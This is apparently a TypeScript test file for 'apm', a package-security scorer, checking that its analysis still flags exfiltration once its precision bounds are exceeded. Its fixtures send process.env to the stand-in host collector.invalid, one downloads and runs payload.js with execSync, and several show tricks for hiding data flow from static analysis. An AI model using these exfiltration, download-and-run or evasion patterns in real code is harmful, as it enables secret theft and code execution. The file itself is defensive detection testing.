// apm-score-v10 round 6 (review of 5b5b492, finding 1): a precision bound never empties a value. Past a bound the value
// keeps every label apm saw, with a `limit:` label that says it was cut; a cut value that may carry what a stealer
// sends (the environment, a credential file) or code to run (a download, the program's own source) into a call that
// sends, runs or loads it makes the analysis incomplete and names the bound. Any other cut stays a note, since the
// bounds fire in most large bundles. Each case below scored 100 at 5b5b492 (the facts case: 97). Payloads are inert
// stand-ins: the one run below runs under recording stubs, and the only host named is collector.invalid.
import { describe, expect, test } from "bun:test";
import vm from "node:vm";
import { analyze, finalize, SCORE_FLOOR, type ScoreReport, type TarEntry } from "../src/index.ts";
import { PRECISION_BOUNDS } from "../src/flow.ts";

const STATE = { publishedAt: 0, now: 1e13, deprecated: null, status: "active", statusReason: null } as const;

function entry(path: string, text: string): TarEntry {
  const data = new TextEncoder().encode(text);

  return { path, size: data.length, mode: 0o644, data };
}

function scoreOf(files: Record<string, string>): ScoreReport {
  const manifest = { name: "bound-review", version: "1.0.0", main: "index.js", license: "MIT" };
  const all = [entry("package.json", JSON.stringify(manifest)), ...Object.entries(files).map(([p, t]) => entry(p, t))];

  return finalize(analyze({ name: manifest.name, manifest, files: all, publisher: "fake", previousPublishers: [] }), STATE);
}

const ids = (r: ScoreReport): string[] => r.signals.map((s) => s.id);
const incomplete = (r: ScoreReport): string => (r.signals.find((s) => s.id === "incomplete")?.evidence ?? []).join("\n");

/** The environment, exported from another file, so the text rules never see it beside the request. */
const SOURCE = { "source.js": "module.exports = process.env;" };
const SEND = "send('https://collector.invalid/', { method: 'POST', body: JSON.stringify(require('./source.js')) });";

/** The review's case: the environment copied through `n` nested `Object.assign({}, v)` calls, then sent. */
const copies = (n: number): Record<string, string> => ({
  "index.js": `const body=${"Object.assign({},".repeat(n)}require('./source.js')${")".repeat(n)};fetch('https://collector.invalid/',{method:'POST',body:JSON.stringify(body)});`,
  ...SOURCE,
});

/** The review's other case: the environment returned before a function's other `n` returns. */
const returns = (n: number): Record<string, string> => ({
  "index.js": `const src=require('./source.js');function f(x){if(x===-1)return src;${Array.from({ length: n }, (_, i) => `if(x===${i})return 'benign${i}';`).join("")}return 'z';}\nfetch('https://collector.invalid/',{method:'POST',body:JSON.stringify(f(1))});`,
  ...SOURCE,
});

const helpers = (n: number): string => Array.from({ length: n }, (_, i) => `function h${i}(u, o) { return [u, o]; }`).join("\n");

describe("the review's two cases score below the floor", () => {
  test("32 nested copies: 100 at 5b5b492, now incomplete; 28 copies are followed to the end, as before", () => {
    const followed = scoreOf(copies(28));
    const cut = scoreOf(copies(32));

    expect(ids(followed)).toContain("exfiltration");
    expect(followed.score).toBeLessThan(SCORE_FLOOR);
    expect(ids(cut)).toContain("incomplete");
    expect(incomplete(cut)).toContain(`index.js:1: `);
    expect(incomplete(cut)).toContain(PRECISION_BOUNDS.steps);
    expect(incomplete(cut)).toContain("what this call sends may be the whole environment");
    expect(cut.score).toBeLessThan(SCORE_FLOOR);
  });

  test("the payload runs: 32 copies still send what the module exports (recording stubs)", () => {
    const code = copies(32)["index.js"] ?? "";
    let sent = "";

    vm.runInNewContext(code, { require: () => ({ REVIEW_MARKER: "inert" }), fetch: (_url: string, init: { body: string }) => void (sent = init.body) }, { timeout: 1000 });
    expect(sent).toBe('{"REVIEW_MARKER":"inert"}');
  });

  test("the environment returned before 32 others: 100 at 5b5b492, now followed (every return is read)", () => {
    for (const n of [31, 32, 40]) {
      const r = scoreOf(returns(n));

      expect(ids(r)).toContain("exfiltration");
      expect(r.score).toBeLessThan(SCORE_FLOOR);
    }
  });
});

describe("every other precision bound: a cut that reaches a request with the environment is incomplete", () => {
  test("an expression with more than 6 possible values, fetch the seventh", () => {
    const r = scoreOf({ "index.js": `${helpers(6)}\nconst k = Date.now() % 7;\nconst send = k===0?h0:k===1?h1:k===2?h2:k===3?h3:k===4?h4:k===5?h5:fetch;\n${SEND}`, ...SOURCE });

    expect(incomplete(r)).toContain(PRECISION_BOUNDS.candidates);
    expect(incomplete(r)).toContain("apm could not tell what this call does, and what it is given may be the whole environment");
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("a constructor that sets one field more than 8 times, fetch the write left out", () => {
    const writes = Array.from({ length: 8 }, (_, i) => `if (k === ${i}) this.send = h0;`).join(" ");
    const r = scoreOf({ "index.js": `${helpers(1)}\nclass C { constructor(k) { if (k === -1) this.send = fetch; ${writes} } }\nconst c = new C(9);\nc.${SEND}`, ...SOURCE });

    expect(incomplete(r)).toContain(PRECISION_BOUNDS.thisWrites);
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("values nested more than 24 levels deep: fetch handed back through 30 functions", () => {
    const chain = Array.from({ length: 30 }, (_, i) => `function g${30 - i}() { return g${29 - i}(); }`).join("\n");
    const r = scoreOf({ "index.js": `${chain}\nfunction g0() { return fetch; }\nconst send = g30();\n${SEND}`, ...SOURCE });

    expect(incomplete(r)).toContain(PRECISION_BOUNDS.depth);
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("a function with more than 32 return statements that hands back fetch", () => {
    const rest = Array.from({ length: 32 }, (_, i) => `if (x === ${i}) return h0;`).join(" ");
    const r = scoreOf({ "index.js": `${helpers(1)}\nfunction pick(x) { if (x === -1) return fetch; ${rest} return h0; }\nconst send = pick(Date.now());\n${SEND}`, ...SOURCE });

    expect(incomplete(r)).toContain(PRECISION_BOUNDS.returns);
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("a command variable given more than 8 values, the one that runs the downloaded file left out (no note at 5b5b492)", () => {
    const others = Array.from({ length: 8 }, (_, i) => `if (Date.now() === ${i}) cmd = process.argv[${i}];`).join(" ");
    const code = `const fs = require('fs'); const cp = require('child_process');\nfetch('https://collector.invalid/a').then((r) => r.text()).then((t) => { fs.writeFileSync('payload.js', t);\nlet cmd = 'true'; if (Date.now() === 99) cmd = 'node payload.js'; ${others}\ncp.execSync(cmd); });`;
    const r = scoreOf({ "index.js": code });

    expect(incomplete(r)).toContain(PRECISION_BOUNDS.assignments);
    expect(incomplete(r)).toContain("what a network response gave");
    expect(r.notChecked.join("\n")).toContain(PRECISION_BOUNDS.assignments);
    expect(r.score).toBeLessThan(SCORE_FLOOR);
  });

  test("the first 40 facts of each kind: an environment dump beside the request after 40 far from it is still placed", () => {
    const far = (i: number): string => `// ${"x".repeat(1600)}\nexports.k${i} = Object.keys(process.env).length;\n`;
    const near = `// ${"y".repeat(1600)}\nglobalThis.__cfg = Object.keys(process.env).map((k) => k + '=' + process.env[k]);\nsetTimeout(() => fetch('https://collector.invalid/', { method: 'POST', body: String(globalThis.__cfg) }), 0);\n`;
    const alone = scoreOf({ "index.js": near });

    for (const n of [1, 39, 45]) {
      const r = scoreOf({ "index.js": Array.from({ length: n }, (_, i) => far(i)).join("") + near });

      expect(ids(r)).toContain("exfiltration");
      expect(r.score).toBe(alone.score);
    }
  });
});

describe("a cut with nothing sensitive, or that reaches no such call, stays a note", () => {
  test("32 nested copies of a constant object, sent", () => {
    const r = scoreOf({ "index.js": `const body=${"Object.assign({},".repeat(32)}{ ok: 1 }${")".repeat(32)};fetch('https://collector.invalid/',{method:'POST',body:JSON.stringify(body)});` });

    expect(ids(r)).not.toContain("incomplete");
    expect(r.notChecked.join("\n")).toContain(PRECISION_BOUNDS.steps);
  });

  test("32 nested copies of the environment, written to the console only", () => {
    const r = scoreOf({ "index.js": `const body=${"Object.assign({},".repeat(32)}require('./source.js')${")".repeat(32)};console.log(Object.keys(body).length);`, ...SOURCE });

    expect(ids(r)).not.toContain("incomplete");
  });

  test("a callee with more than 6 values handed a constant", () => {
    const r = scoreOf({ "index.js": `${helpers(7)}\nconst k = Date.now() % 7;\nconst send = k===0?h0:k===1?h1:k===2?h2:k===3?h3:k===4?h4:k===5?h5:h6;\nsend('https://collector.invalid/', { method: 'POST', body: 'hello' });` });

    expect(ids(r)).not.toContain("incomplete");
    expect(r.notChecked.join("\n")).toContain(PRECISION_BOUNDS.candidates);
  });
});
